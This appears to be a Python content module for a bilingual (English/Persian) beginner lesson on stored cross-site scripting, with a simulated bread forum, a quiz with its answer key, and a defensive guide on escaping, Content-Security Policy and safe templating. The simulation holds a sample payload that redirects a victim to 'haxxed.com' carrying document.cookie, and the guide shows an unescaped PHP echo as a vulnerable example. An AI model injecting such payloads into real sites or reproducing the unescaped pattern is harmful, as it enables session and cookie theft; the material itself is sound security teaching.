LESSON = {
    "slug": "cross-site-scripting",
    "title": "Cross-Site Scripting (XSS)",
    "summary": "Learn how stored XSS lets attackers run JavaScript in another user's browser.",
    "difficulty": "beginner",
    "sort_order": 3,
    "estimated_minutes": 15,
    "simulation_key": "cross-site-scripting",
    "required_locales": ("fa", "en"),
    "guide_path": "/lessons/cross-site-scripting-guide",
    "quiz_path": "/lessons/cross-site-scripting-quiz",
    "quiz_start_path": "/lessons/cross-site-scripting-quiz-start",
    "lessons_path": "/lessons",
    "total_steps": 7,
    "final_step": 6,
    "steps": [
        [
            {"type": "text", "text": "Imagine you are the owner of "},
            {"type": "strong", "text": "breddit.com"},
            {
                "type": "text",
                "text": ", the number one social media site for the baking industry. You have an avid community of commenters who love sharing their bread knowledge.",
            },
        ],
        [
            {
                "type": "text",
                "text": "Because the main use of your website is to facilitate discussion, users can add comments, which are saved to the database and displayed to other users.",
            }
        ],
        [
            {
                "type": "text",
                "text": "Unfortunately the popularity of your site has also attracted the attention of hackers, who want to access your site for nefarious purposes.",
            }
        ],
        [
            {
                "type": "text",
                "text": "Unless you are careful when constructing the HTML, hackers can abuse the comment function by injecting JavaScript.",
            }
        ],
        [
            {"type": "text", "text": "Watch how "},
            {"type": "strong", "text": "Mal"},
            {"type": "text", "text": " injects malicious JavaScript to attack another user."},
        ],
        [
            {
                "type": "text",
                "text": "A real attack might use injected JavaScript to redirect Vic to a malicious website under Mal's control, allowing Mal to steal his cookies.",
            }
        ],
        [{"type": "text", "text": "Let's learn how to protect against cross-site scripting!"}],
    ],
    "completion": [
        {"type": "text", "text": "Now that you have seen how stored XSS works, let's learn how to protect against it."}
    ],
    "simulation": {
        "site_url": "www.breddit.com",
        "thread_title": "How much do you folks like bread?",
        "comments": [
            {"author": "roll_with_it", "text": "i dream of baking tins."},
            {
                "author": "k_knead_you_right_now",
                "text": "i love it so much, i think i might be part duck",
            },
        ],
        "placeholder": "Type a comment...",
        "attacks": {
            "4": "<script>alert('Your croissants are limp and sad')</script>",
            "5": "<script>window.location='haxxed.com?cookie=' + document.cookie</script>",
        },
        "alert": "Your croissants are limp and sad",
    },
    "quiz_intro": {
        "eyebrow": "Test your knowledge",
        "icon": "🧠",
        "title": "Quiz: Cross-Site Scripting",
        "summary": "Take this quick quiz to show you were paying attention.",
        "start_button": "Start the quiz",
        "review_button": "Review the material one more time →",
    },
    "quiz": {
        "title": "Cross-Site Scripting quiz",
        "instructions": "Take this quick quiz to show you were paying attention.",
        "pass_percentage": 100,
        "shuffle_questions": False,
        "shuffle_answers": False,
        "questions": [
            {
                "key": "stored-xss-impact",
                "type": "multi",
                "prompt": "If an attacker manages to store malicious JavaScript in your database, what could they do when another user views that content?",
                "answers": [
                    {
                        "key": "hijack-session",
                        "text": "Hijack the user's session by running code in their browser",
                        "is_correct": True,
                    },
                    {
                        "key": "drop-tables-browser",
                        "text": "Drop database tables directly from the browser without a server request",
                        "is_correct": False,
                    },
                    {
                        "key": "disable-https",
                        "text": "Disable HTTPS for every visitor at the network level",
                        "is_correct": False,
                    },
                    {
                        "key": "read-env-vars",
                        "text": "Read private server environment variables directly from JavaScript",
                        "is_correct": False,
                    },
                ],
            },
            {
                "key": "xss-prevention",
                "type": "multi",
                "prompt": "What is the best default defense when rendering user-controlled text into HTML?",
                "answers": [
                    {
                        "key": "escape-dynamic-content",
                        "text": "Escape dynamic content before writing it into the page",
                        "is_correct": True,
                    },
                    {
                        "key": "obfuscate-js",
                        "text": "Obfuscate your JavaScript bundle before deployment",
                        "is_correct": False,
                    },
                    {
                        "key": "disable-js",
                        "text": "Ask users to disable JavaScript in their browser",
                        "is_correct": False,
                    },
                    {
                        "key": "hide-form-css",
                        "text": "Hide the comment form with CSS after submission",
                        "is_correct": False,
                    },
                ],
            },
        ],
    },
}


LESSON_TRANSLATIONS = {
    "fa": {
        **LESSON,
        "summary": "یاد بگیر Stored XSS چطور به مهاجم اجازه می‌دهد JavaScript را در مرورگر کاربر دیگری اجرا کند.",
        "steps": [
            [
                {"type": "text", "text": "تصور کن مالک "},
                {"type": "strong", "text": "breddit.com", "dir": "ltr"},
                {
                    "type": "text",
                    "text": " هستی؛ محبوب‌ترین شبکه اجتماعی برای جامعه نان‌پزی. کاربرهای زیادی داری که عاشق حرف زدن درباره نان، دستور پخت و تجربه‌هایشان هستند.",
                },
            ],
            [
                {
                    "type": "text",
                    "text": "چون هدف اصلی سایت تو گفت‌وگو است، کاربرها می‌توانند نظر بنویسند. این نظرها در دیتابیس ذخیره می‌شوند و بعد برای بقیه کاربران نمایش داده می‌شوند.",
                }
            ],
            [
                {
                    "type": "text",
                    "text": "اما همین محبوبیت باعث شده هکرها هم به سایتت توجه کنند؛ کسانی که می‌خواهند از سایت برای هدف‌های مخرب استفاده کنند.",
                }
            ],
            [
                {
                    "type": "text",
                    "text": "اگر موقع ساختن HTML دقت نکنی، مهاجم می‌تواند از بخش نظرات سوءاستفاده کند و JavaScript مخرب داخل صفحه تزریق کند.",
                }
            ],
            [
                {"type": "text", "text": "ببین "},
                {"type": "strong", "text": "Mal", "dir": "ltr"},
                {
                    "type": "text",
                    "text": " چطور با تزریق JavaScript مخرب، کاربر دیگری را هدف قرار می‌دهد.",
                },
            ],
            [
                {
                    "type": "text",
                    "text": "در یک حمله واقعی، JavaScript تزریق‌شده می‌تواند Vic را به یک سایت مخرب که تحت کنترل Mal است منتقل کند؛ جایی که Mal می‌تواند کوکی‌های او را بدزدد.",
                }
            ],
            [
                {
                    "type": "text",
                    "text": "حالا یاد بگیریم چطور از سایت در برابر Cross-Site Scripting محافظت کنیم.",
                }
            ],
        ],
        "completion": [
            {
                "type": "text",
                "text": "حالا که دیدی Stored XSS چطور کار می‌کند، بیایید یاد بگیریم چطور جلوی آن را بگیریم.",
            }
        ],
        "simulation": {
            **LESSON["simulation"],
            "thread_title": "شما چقدر نان دوست دارید؟",
            "comments": [
                {
                    "author": "roll_with_it",
                    "text": "من حتی خواب قالب‌های نان‌پزی را می‌بینم.",
                },
                {
                    "author": "k_knead_you_right_now",
                    "text": "آن‌قدر نان دوست دارم که فکر کنم یک کم اردک شده‌ام.",
                },
            ],
            "placeholder": "نظر خود را بنویس...",
        },
        "quiz_intro": {
            **LESSON["quiz_intro"],
            "eyebrow": "دانشت را امتحان کن",
            "title": "آزمون: Cross-Site Scripting",
            "summary": "با این آزمون کوتاه مطمئن شو نکته‌های اصلی را گرفته‌ای.",
            "start_button": "شروع آزمون",
            "review_button": "یک بار دیگر مطالب را مرور کن ←",
        },
        "quiz": {
            **LESSON["quiz"],
            "title": "آزمون Cross-Site Scripting",
            "instructions": "با این آزمون کوتاه مطمئن شو نکته‌های اصلی را گرفته‌ای.",
            "questions": [
                {
                    **LESSON["quiz"]["questions"][0],
                    "prompt": "اگر مهاجم بتواند JavaScript مخرب را داخل دیتابیس ذخیره کند، وقتی کاربر دیگری آن محتوا را می‌بیند چه کاری ممکن است انجام دهد؟",
                    "answers": [
                        {
                            **LESSON["quiz"]["questions"][0]["answers"][0],
                            "text": "نشست کاربر را با اجرای کد در مرورگر او بدزدد",
                        },
                        {
                            **LESSON["quiz"]["questions"][0]["answers"][1],
                            "text": "بدون هیچ درخواست سمت سرور، جدول‌های دیتابیس را مستقیم از مرورگر حذف کند",
                        },
                        {
                            **LESSON["quiz"]["questions"][0]["answers"][2],
                            "text": "HTTPS را برای همه بازدیدکننده‌ها در سطح شبکه غیرفعال کند",
                        },
                        {
                            **LESSON["quiz"]["questions"][0]["answers"][3],
                            "text": "متغیرهای خصوصی محیط سرور را مستقیم از JavaScript بخواند",
                        },
                    ],
                },
                {
                    **LESSON["quiz"]["questions"][1],
                    "prompt": "بهترین دفاع پیش‌فرض هنگام نمایش متن کنترل‌شده توسط کاربر داخل HTML چیست؟",
                    "answers": [
                        {
                            **LESSON["quiz"]["questions"][1]["answers"][0],
                            "text": "محتوای dynamic را قبل از نوشتن داخل صفحه escape کنیم",
                        },
                        {
                            **LESSON["quiz"]["questions"][1]["answers"][1],
                            "text": "فایل JavaScript را قبل از انتشار obfuscate کنیم",
                        },
                        {
                            **LESSON["quiz"]["questions"][1]["answers"][2],
                            "text": "از کاربر بخواهیم JavaScript مرورگرش را غیرفعال کند",
                        },
                        {
                            **LESSON["quiz"]["questions"][1]["answers"][3],
                            "text": "بعد از ارسال نظر، فرم کامنت را با CSS پنهان کنیم",
                        },
                    ],
                },
            ],
        },
    }
}


GUIDE = {
    "overview": {
        "title": "Cross-Site Scripting",
        "metrics": [
            {"icon": "📊", "label": "Prevalence", "value": "Common", "tone": "orange"},
            {"icon": "💣", "label": "Exploitability", "value": "Easy", "tone": "red"},
            {"icon": "🔥", "label": "Impact", "value": "Harmful", "tone": "rose"},
        ],
        "paragraphs": [
            [
                {"type": "strong", "text": "Cross-site scripting"},
                {
                    "type": "text",
                    "text": " (XSS) is one of the most common methods hackers use to attack websites. XSS vulnerabilities permit a malicious user to execute arbitrary chunks of JavaScript when other users visit your site.",
                },
            ],
            [
                {
                    "type": "strong",
                    "text": "XSS is the most common publicly reported security vulnerability, and part of every hacker's toolkit.",
                }
            ],
        ],
    },
    "risks": {
        "title": "Risks",
        "question": "What could a determined hacker do when exploiting an XSS vulnerability?",
        "intro": "XSS allows arbitrary execution of JavaScript code, so the damage that can be done by an attacker depends on the sensitivity of the data being handled by your site. Some of the things hackers have done by exploiting XSS include:",
        "bullets": [
            [
                {"type": "strong", "text": "Spreading"},
                {"type": "text", "text": " worms "},
                {"type": "strong", "text": "on social media sites."},
                {
                    "type": "text",
                    "text": " Facebook, Twitter and YouTube have all been successfully attacked in this way.",
                },
            ],
            [
                {"type": "strong", "text": "Session hijacking."},
                {
                    "type": "text",
                    "text": " Malicious JavaScript may be able to send the session ID to a remote site under the hacker's control, allowing the hacker to impersonate that user by hijacking a session in progress.",
                },
            ],
            [
                {"type": "strong", "text": "Identity theft."},
                {
                    "type": "text",
                    "text": " If the user enters confidential information such as credit card numbers into a compromised website, these details can be stolen using malicious JavaScript.",
                },
            ],
            [{"type": "text", "text": "Denial of service attacks "}, {"type": "strong", "text": "and website vandalism."}],
            [{"type": "strong", "text": "Theft of sensitive data"}, {"type": "text", "text": " like passwords."}],
            [{"type": "strong", "text": "Financial fraud"}, {"type": "text", "text": " on banking sites."}],
        ],
        "closing": "XSS vulnerabilities continue to be among the most exploited web application flaws worldwide, impacting even major social networks and financial institutions.",
    },
    "protection": {
        "title": "Protection",
        "intro": "To protect against stored XSS attacks, make sure any dynamic content coming from the data store cannot be used to inject JavaScript on a page.",
        "table_headings": ["Character", "Encoding"],
        "framework_note": "Most modern frameworks will escape dynamic content by default — see the code samples below for details.",
        "escape_closing": "Escaping editable content in this way means it will never be treated as executable code by the browser. This closes the door on most XSS attacks.",
        "sections": [
            {
                "heading": "Escape Dynamic Content",
                "paragraphs": [
                    [
                        {"type": "text", "text": "Web pages are made up of HTML, usually described in template files, with dynamic content woven in when the page is rendered. "},
                        {"type": "strong", "text": "Stored XSS attacks"},
                        {"type": "text", "text": " make use of the improper treatment of dynamic content coming from a backend data store. The attacker abuses an editable field by inserting some JavaScript code, which is evaluated in the browser when another user visits that page."},
                    ],
                    [
                        {"type": "text", "text": "Unless your site is a content-management system, it is rare that you want your users to author raw HTML. Instead, you should "},
                        {"type": "strong", "text": "escape"},
                        {"type": "text", "text": " all dynamic content coming from a data store, so the browser knows it is to be treated as the contents of HTML tags, as opposed to raw HTML."},
                    ],
                    [{"type": "text", "text": "Escaping dynamic content generally consists of replacing significant characters with the HTML entity encoding:"}],
                ],
            },
            {
                "heading": "Allowlist Values",
                "paragraphs": [[{"type": "text", "text": "If a particular dynamic data item can only take a handful of valid values, the best practice is to restrict the values in the data store, and have your rendering logic only permit known good values. For instance, instead of asking a user to type in their country of residence, have them select from a drop-down list."}]],
            },
            {
                "heading": "Implement a Content-Security Policy",
                "paragraphs": [
                    [
                        {"type": "text", "text": "Browsers support Content-Security Policies that allow the author of a web page to control where JavaScript and other resources can be loaded and executed from. XSS attacks rely on the attacker being able to run malicious scripts on a user's web page — either by injecting inline "},
                        {"type": "code", "text": "<script>"},
                        {"type": "text", "text": " tags somewhere within the HTML of a page, or by tricking the browser into loading JavaScript from a malicious third-party domain."},
                    ],
                    [{"type": "text", "text": "By setting a content security policy in the response header, you can tell the browser to never execute inline JavaScript, and to lock down which domains can host JavaScript for a page:"}],
                ],
                "terminal": "policyHeader",
                "after_terminal": [
                    [{"type": "strong", "text": "By listing the URIs from which scripts can be loaded, you are implicitly stating that inline JavaScript is not allowed."}],
                    [{"type": "text", "text": "The content security policy can also be set in a meta tag in the "}, {"type": "code", "text": "head"}, {"type": "text", "text": " element of the page:"}],
                ],
                "second_terminal": "metaPolicy",
                "closing": [
                    [
                        {"type": "strong", "text": "This approach will protect your users very effectively!"},
                        {"type": "text", "text": " However, it may take a considerable amount of discipline to make your site ready for such a header. Inline script tags are considered bad practice in modern web development, but are common in older sites."},
                    ],
                    [{"type": "text", "text": "To migrate away from inline scripts incrementally, consider making use of CSP Violation Reports. By adding a report-to directive in your policy header, the browser will notify you of any policy violations rather than preventing inline JavaScript from executing:"}],
                ],
                "third_terminal": "reportPolicy",
                "final_paragraph": "This will give you reassurance that there are no lingering inline scripts before you ban them outright.",
            },
            {
                "heading": "Sanitize HTML",
                "paragraphs": [[{"type": "text", "text": "Some sites have a legitimate need to store and render raw HTML. If your site stores and renders rich content, you need to use an HTML sanitization library to ensure malicious users cannot inject scripts in their HTML submissions."}]],
            },
        ],
    },
    "code_samples": {
        "icon": "</>",
        "title": "Code Samples",
        "intro": "Preventing XSS vulnerabilities requires using the right code libraries, and performing thorough code reviews. Below are some examples of what to look out for when checking your code.",
        "quiz_cta": {
            "eyebrow": "Ready to test your understanding?",
            "icon": "🧠",
            "label": "Quiz:",
            "title": "Cross-Site Scripting",
            "summary": "Take a quick quiz to show you were paying attention →",
            "path": "/lessons/cross-site-scripting-quiz",
        },
        "items": [
            {"title": "Node", "samples": [{"heading": "Mustache.js", "blocks": [{"text": "Tags in double mustaches automatically escape HTML:", "code": "{{ contents }}"}, {"text": "Tags in triple mustaches do not escape HTML, and should be used with care:", "code": "{{{ contents }}}"}]}, {"heading": "Dust.js", "blocks": [{"text": "Key tags automatically escape HTML:", "code": "{ contents }"}, {"text": "However, escaping can be disabled with the |s operator, so use this with care:", "code": "{ contents | s }"}]}, {"heading": "Nunjucks", "blocks": [{"text": "If auto-escaping is turned on in the environment, Nunjucks will automatically escape tags for safe output:", "code": "{{ contents }}"}, {"text": "Content marked with the safe filter will not be escaped — use this function with care:", "code": "{{ contents | safe }}"}, {"text": "Auto-escaping can be disabled for a template, in which case tags need to be escaped manually:", "code": "{{ contents | escape }}"}]}]},
            {"title": "Python", "samples": [{"heading": "Django", "blocks": [{"text": "Templates in Django escape HTML by default, so anything that looks like the following is generally safe:", "code": "{{ contents }}"}, {"text": "You can override escape by using the |safe filter. There are often good reasons to do this, but you will need to conduct code reviews on anything that uses this command:", "code": "{{ contents | safe }}"}, {"text": "Note that HTML-escaping can also be turned on or off with the {% autoescape %} tag."}]}, {"heading": "Flask", "blocks": [{"text": "Flask templates escape HTML by default, so code that looks like the following is generally safe:", "code": "<ul id=\"navigation\">\n  {% for item in navigation %}\n    <li><a href=\"{{ item.href }}\">{{ item.caption }}</a></li>\n  {% endfor %}\n</ul>"}, {"text": "However, escaping can be turned off by using the safe keyword:", "code": "<ul id=\"navigation\">\n  {% for item in navigation %}\n    <li><a href=\"{{ item.href }}\">{{ item.caption | safe }}</a></li>\n  {% endfor %}\n</ul>"}, {"text": "Or enclosing everything in an autoescape false block:", "code": "{% autoescape false %}\n  <ul id=\"navigation\">\n    {% for item in navigation %}\n      <li><a href=\"{{ item.href }}\">{{ item.caption }}</a></li>\n    {% endfor %}\n  </ul>\n{% endautoescape %}"}, {"text": "Be sure to conduct code reviews on any templates that use these features!"}]}]},
            {"title": "Ruby", "samples": [{"heading": "Rails", "blocks": [{"text": "Rails templates escape HTML by default, so anything that looks like the following is generally safe:", "code": "<%= contents %>"}, {"text": "You can override escape by using the raw function, or using the <%== operator. There are often good reasons to do this, but you will need to conduct code reviews on anything that uses these functions:", "code": "<%= raw contents %>\n\n<%== contents %>"}]}]},
            {"title": "C#", "samples": [{"heading": "ASP.NET", "blocks": [{"text": "Use either of the following functions to safely escape HTML. The <%: form was introduced in ASP.NET 4.0:", "code": "<%= HttpUtility.HtmlEncode(contents) %>\n\n<%: contents %>"}, {"text": "The following way of writing to a template does not escape HTML automatically, so you should use it with care:", "code": "<%= contents %>"}, {"text": "Use HttpUtility.HtmlEncode(...) if you need to escape HTML manually."}]}]},
            {"title": "PHP", "samples": [{"heading": "PHP templates", "blocks": [{"text": "The echo command does not escape HTML by default, which means that any code like the following, which pulls data directly out of the HTTP request, is vulnerable to XSS attacks:", "code": "<?php\n  echo $_POST[\"comment\"];\n?>"}, {"text": "Be sure to use the strip_tags function or the htmlspecialchars function to safely escape parameters:", "code": "<?php\n  echo strip_tags($_POST[\"comment\"]);\n?>"}]}]},
            {"title": "AngularJS", "samples": [{"heading": "Angular templates", "blocks": [{"text": "In Angular, any dynamic content written out in curly brackets will automatically be escaped, so the following is safe:", "code": "<div>{{dynamicContent}}</div>"}, {"text": "Be wary of any code that binds dynamic content to the innerHTML attribute since that will not be escaped automatically:", "code": "<div [innerHTML]=\"dynamicContent\"></div>\n<div innerHTML=\"{{dynamicContent}}\"></div>"}]}]},
            {"title": "React", "samples": [{"heading": "React components", "blocks": [{"text": "In React, any dynamic content written out in curly brackets will automatically be escaped, so the following is safe:", "code": "render() {\n  return <div>{dynamicContent}</div>;\n}"}, {"text": "React allows you to write out raw HTML by binding content to the dangerouslySetInnerHTML property, which is named to remind you of the security risk. Watch out for any code that looks like the following:", "code": "render() {\n  return <div dangerouslySetInnerHTML={{ __html: dynamicContent }} />;\n}"}]}]},
        ],
    },
}


GUIDE_TRANSLATIONS = {
    "fa": {
        **GUIDE,
        "overview": {
            **GUIDE["overview"],
            "metrics": [
                {"icon": "📊", "label": "چقدر رایج است", "value": "زیاد", "tone": "orange"},
                {"icon": "💣", "label": "سوءاستفاده از آن", "value": "آسان", "tone": "red"},
                {"icon": "🔥", "label": "شدت آسیب", "value": "زیاد", "tone": "rose"},
            ],
            "paragraphs": [
                [
                    {"type": "strong", "text": "Cross-Site Scripting", "dir": "ltr"},
                    {"type": "text", "text": " یا XSS یکی از رایج‌ترین روش‌هایی است که مهاجم‌ها برای حمله به وب‌سایت‌ها استفاده می‌کنند. وقتی سایت نسبت به XSS آسیب‌پذیر باشد، یک کاربر مخرب می‌تواند کاری کند که هنگام بازدید دیگران از سایت، قطعه‌ای JavaScript در مرورگر آن‌ها اجرا شود."},
                ],
                [{"type": "strong", "text": "XSS از رایج‌ترین آسیب‌پذیری‌های گزارش‌شده در وب است و تقریباً در جعبه‌ابزار هر مهاجمی پیدا می‌شود."}],
            ],
        },
        "risks": {
            "title": "خطرها",
            "question": "اگر یک مهاجم جدی از XSS سوءاستفاده کند، چه کارهایی می‌تواند انجام دهد؟",
            "intro": "XSS امکان اجرای JavaScript دلخواه را فراهم می‌کند. میزان آسیب به این بستگی دارد که سایت تو چه داده‌هایی را مدیریت می‌کند. نمونه‌هایی از کارهایی که مهاجم‌ها با XSS انجام داده‌اند:",
            "bullets": [
                [{"type": "strong", "text": "پخش کردن کرم‌ها"}, {"type": "text", "text": " در شبکه‌های اجتماعی. Facebook، Twitter و YouTube هم قبلاً با این روش مورد حمله قرار گرفته‌اند."}],
                [{"type": "strong", "text": "ربودن نشست کاربر."}, {"type": "text", "text": " JavaScript مخرب ممکن است session ID را به سایتی تحت کنترل مهاجم بفرستد و به او اجازه دهد خودش را جای کاربر جا بزند."}],
                [{"type": "strong", "text": "سرقت هویت."}, {"type": "text", "text": " اگر کاربر اطلاعات حساسی مثل شماره کارت را در یک سایت آلوده وارد کند، همان اطلاعات می‌تواند با JavaScript مخرب دزدیده شود."}],
                [{"type": "text", "text": "حمله‌های از کار انداختن سرویس و خرابکاری در ظاهر سایت."}],
                [{"type": "text", "text": "سرقت داده‌های حساس مثل رمز عبور."}],
                [{"type": "text", "text": "تقلب مالی در سایت‌های بانکی."}],
            ],
            "closing": "آسیب‌پذیری‌های XSS هنوز هم جزو پر‌استفاده‌ترین ضعف‌های امنیتی وب هستند و حتی شبکه‌های اجتماعی بزرگ و سرویس‌های مالی را هم درگیر کرده‌اند.",
        },
        "protection": {
            **GUIDE["protection"],
            "title": "محافظت",
            "intro": "برای محافظت در برابر Stored XSS باید مطمئن شوی محتوای dynamic که از دیتابیس می‌آید، نتواند JavaScript را داخل صفحه تزریق و اجرا کند.",
            "table_headings": ["کاراکتر", "کدگذاری"],
            "framework_note": "بیشتر frameworkهای مدرن محتوای dynamic را به‌صورت پیش‌فرض escape می‌کنند؛ نمونه‌های کد پایین صفحه جزئیات بیشتری نشان می‌دهند.",
            "escape_closing": "وقتی محتوای قابل ویرایش این‌طور escape شود، مرورگر دیگر آن را کد اجرایی حساب نمی‌کند. همین کار جلوی بیشتر حمله‌های XSS را می‌گیرد.",
            "sections": [
                {
                    "heading": "Escape کردن محتوای Dynamic",
                    "paragraphs": [
                        [{"type": "text", "text": "صفحه‌های وب از HTML ساخته می‌شوند؛ معمولاً داخل templateها تعریف می‌شوند و هنگام نمایش صفحه، محتوای dynamic در آن‌ها قرار می‌گیرد. "}, {"type": "strong", "text": "حمله Stored XSS"}, {"type": "text", "text": " از همین نقطه سوءاستفاده می‌کند: داده‌ای که از دیتابیس می‌آید درست مدیریت نمی‌شود. مهاجم در یک فیلد قابل ویرایش JavaScript قرار می‌دهد و وقتی کاربر دیگری صفحه را باز می‌کند، آن کد در مرورگر اجرا می‌شود."}],
                        [{"type": "text", "text": "اگر سایت تو یک سیستم مدیریت محتوا نیست، معمولاً نمی‌خواهی کاربرها HTML خام بنویسند. بهتر است همه محتوای dynamic که از دیتابیس می‌آید را "}, {"type": "strong", "text": "escape"}, {"type": "text", "text": " کنی تا مرورگر آن را متن معمولی داخل HTML بداند، نه HTML خام و قابل اجرا."}],
                        [{"type": "text", "text": "Escape کردن محتوای dynamic معمولاً یعنی کاراکترهای مهم با HTML entity جایگزین شوند:"}],
                    ],
                },
                {"heading": "استفاده از مقدارهای مجاز", "paragraphs": [[{"type": "text", "text": "اگر یک داده dynamic فقط می‌تواند چند مقدار مشخص و معتبر داشته باشد، بهترین کار این است که همان مقدارها را در دیتابیس محدود کنی و منطق نمایش فقط همان مقدارهای امن را قبول کند. مثلاً به‌جای اینکه از کاربر بخواهی کشور محل زندگی‌اش را دستی تایپ کند، بهتر است از یک لیست انتخابی استفاده کنی."}]]},
                {
                    **GUIDE["protection"]["sections"][2],
                    "heading": "پیاده‌سازی Content-Security Policy",
                    "paragraphs": [
                        [{"type": "text", "text": "مرورگرها از Content-Security Policy پشتیبانی می‌کنند؛ قابلیتی که به سازنده صفحه اجازه می‌دهد مشخص کند JavaScript و منابع دیگر از کجا اجازه بارگذاری و اجرا دارند. حمله XSS معمولاً به اجرای اسکریپت مخرب در صفحه کاربر وابسته است؛ یا با تزریق تگ "}, {"type": "code", "text": "<script>"}, {"type": "text", "text": " داخل HTML صفحه، یا با مجبور کردن مرورگر به بارگذاری JavaScript از یک دامنه مخرب."}],
                        [{"type": "text", "text": "با تنظیم Content-Security Policy در response header می‌توانی به مرورگر بگویی inline JavaScript را اجرا نکند و فقط از دامنه‌های مشخص‌شده JavaScript بگیرد:"}],
                    ],
                    "after_terminal": [
                        [{"type": "strong", "text": "وقتی URIهای مجاز برای بارگذاری script را مشخص می‌کنی، عملاً می‌گویی inline JavaScript اجازه اجرا ندارد."}],
                        [{"type": "text", "text": "Content-Security Policy را می‌توان داخل meta tag در بخش "}, {"type": "code", "text": "head"}, {"type": "text", "text": " صفحه هم تنظیم کرد:"}],
                    ],
                    "closing": [
                        [{"type": "strong", "text": "این روش می‌تواند خیلی خوب از کاربران محافظت کند."}, {"type": "text", "text": " البته آماده کردن سایت برای چنین headerای کمی نظم و سخت‌گیری می‌خواهد. inline script در توسعه مدرن وب کار خوبی نیست، اما در سایت‌های قدیمی زیاد دیده می‌شود."}],
                        [{"type": "text", "text": "برای مهاجرت تدریجی از inline scriptها می‌توانی از CSP Violation Reports استفاده کنی. با اضافه کردن report-to directive، مرورگر به‌جای اینکه فوراً اجرای inline JavaScript را متوقف کند، نقض policy را به تو گزارش می‌دهد:"}],
                    ],
                    "final_paragraph": "این کار به تو اطمینان می‌دهد قبل از ممنوع کردن کامل inline scriptها، مورد پنهانی و جا‌مانده‌ای در سایت باقی نمانده است.",
                },
                {"heading": "Sanitize کردن HTML", "paragraphs": [[{"type": "text", "text": "بعضی سایت‌ها واقعاً نیاز دارند HTML خام را ذخیره و نمایش دهند. اگر سایت تو محتوای rich ذخیره و render می‌کند، باید از یک کتابخانه sanitization برای HTML استفاده کنی تا کاربرهای مخرب نتوانند داخل HTML ارسالی خود script تزریق کنند."}]]},
            ],
        },
        "code_samples": {
            **GUIDE["code_samples"],
            "title": "نمونه کدها",
            "intro": "برای جلوگیری از آسیب‌پذیری‌های XSS باید از کتابخانه‌های درست استفاده کنی و code review را جدی بگیری. نمونه‌های زیر نشان می‌دهند هنگام بررسی کد باید حواست به چه چیزهایی باشد.",
            "quiz_cta": {
                **GUIDE["code_samples"]["quiz_cta"],
                "eyebrow": "یاد گرفتی؟",
                "label": "آزمون:",
                "summary": "یک آزمون کوتاه بده تا مطمئن شوی نکته‌ها را خوب گرفته‌ای ←",
            },
        },
    }
}


def inline_plain_text(parts):
    return "".join(part["text"] for part in parts if part["type"] != "break")
